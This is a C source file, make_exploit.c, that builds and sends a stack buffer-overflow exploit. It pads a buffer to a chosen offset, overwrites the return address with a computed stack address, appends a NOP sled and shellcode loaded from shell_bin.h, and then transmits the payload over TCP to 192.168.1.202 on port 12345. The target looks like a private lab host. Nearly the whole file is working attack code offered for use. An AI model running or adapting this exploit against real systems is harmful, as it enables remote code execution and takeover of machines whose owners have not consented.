// make_exploit.c
// Requires: shell_bin.h (unsigned char shell_bin[]; unsigned int shell_bin_len;)
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shell_bin.h"
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void write_u64_le(unsigned char *b, uint64_t v){
    for(int i=0;i<8;i++){ b[i] = (unsigned char)(v & 0xff); v >>= 8; }
}

int main(int argc, char **argv){
    if (argc < 3){
        fprintf(stderr, "Usage: %s <buffer_address> <offset>\n", argv[0]);
        return 1;
    }
    int debug = (argc > 3 && strcmp(argv[3], "debug") == 0) || (argc > 4 && strcmp(argv[4], "debug")) ? 1 : 0;
    int payload_print = (argc > 3 && strcmp(argv[3], "print_payload") == 0) || (argc > 4 && strcmp(argv[4], "print_payload") == 0)? 1 : 0;
    size_t offset = (size_t)atoi(argv[2]);           // printed offset (decimal)
    uint64_t ret_addr = (uint64_t)(strtoull(argv[1], NULL, 0) + offset + 8); // where we want execution to jump TODO: check this calculatino!!
    uint64_t return_slot = (uint64_t)(ret_addr - 8); // the return address slot on the stack
    size_t shell_len = (size_t)shell_bin_len;
    // Debug prints
    if (debug){
        printf("================= Debug Info ================\n");
        printf("Buffer address: 0x%llx\n", strtoull(argv[1], NULL, 0));
        printf("Using return address: 0x%lx\n", ret_addr);
        printf("Shellcode length: %zu bytes\n", shell_len);
        printf("Offset to return address: %zu bytes\n", offset);
        printf("return slot on the stack: 0x%lx\n", return_slot);
        printf("=============================================\n");
        // print shell_bin for debug, as 8 bytes per line
        printf("================= Shellcode Bytes ===============\n");
        printf("Shellcode bytes:\n");
        for(size_t i=0;i<shell_len;i++){
            printf("%02x ", shell_bin[i]);
            if ((i+1) % 8 == 0) printf("\n");
        }
        printf("\n=============================================\n");
        
    }

    // total payload: NOP + shell + padding_to_offset + 8-byte ret
    size_t nop_add_number = 0; // extra NOPs to add for safety
    size_t total = offset + shell_len + 8 + nop_add_number;

    unsigned char *payload = malloc(total);
    if (!payload) return 1;

    size_t off = 0;
    // NOP sled
    memset(payload + off, 0x41, offset);
    if (debug){
        printf("================== NOP Sled Bytes ================\n");
        // print NOP sled, as 8 bytes per line
        printf("NOP sled bytes:\n");
        for(size_t i=0;i<offset;i++){
            printf("%02x ", payload[i]);
            if ((i+1) % 8 == 0) printf("\n");
        }
        printf("\n=============================================\n");
    }
    off += offset;

    // shell code
    write_u64_le(payload +off, ret_addr);
    if(debug){
        printf("================== Return Address Write ================\n");
        printf("Written return address: 0x%lx at offset %zu\n", ret_addr, off);
        // print the payload so far, in 8 bytes per line
        printf("Payload bytes so far:\n");
        for(size_t i=0;i<off+8;i++){
            printf("%02x ", payload[i]);
            if ((i+1) % 8 == 0) printf("\n");
        }
        printf("\n=============================================\n");
    }
    //debug: print ret addr
    if (debug){
        printf("================== Return Address Bytes ================\n");
        // print the ret_addr as 8bytes in hex
        printf("Return address bytes:\n");
        for(int i=0;i<8;i++){
            printf("%02x ", ((unsigned char*)&ret_addr)[i]);
        }   
        printf("\n=============================================\n");
    }
    off += 8;
    // inserting the nop as nop_add_number
    memset(payload + off, 0x90, nop_add_number);
    off += nop_add_number;
    memcpy(payload + off, shell_bin, shell_len);

    size_t payload_len = shell_len + off;


    int sock_fd;
    struct sockaddr_in server_addr;

    // assign IP, PORT
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.202");
    server_addr.sin_port = htons(12345);

    /* Create socket */
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        exit(1);
    }
    else{
        if (debug){ printf("Socket created.\n");}
    }

    // connect
    int _connect = connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (_connect < 0) {
        exit(1);
    }
    else{
        if (debug){ printf("Connected to server.\n");}
        
    }

    ssize_t bytes_sent = send(sock_fd, payload, (size_t)payload_len, 0);
    if(debug){
        printf("Sent %zd bytes to server.\n", bytes_sent);
    }
    if (bytes_sent == -1) {
        perror("send");
        exit(1);
    } else if ((size_t)bytes_sent != payload_len) {
        printf("Partial send: %zd of %zu bytes\n", bytes_sent, payload_len);
        exit(1);
    }


    // print payload in hex
    if (payload_print){
        printf("================== Final Payload ================\n");
        // print the payload so far, in 8 bytes per line
        printf("Final Payload (%zu bytes):\n", payload_len);
        for(size_t i=0;i<payload_len;i++){
            printf("%02x ", payload[i]);
            if ((i+1) % 8 == 0) printf("\n");
        }
        printf("\n=============================================\n");
    }

    close(sock_fd);
    free(payload);
    if(debug){
        printf("Socket closed. Exiting.\n");
    }
    return 0;
}
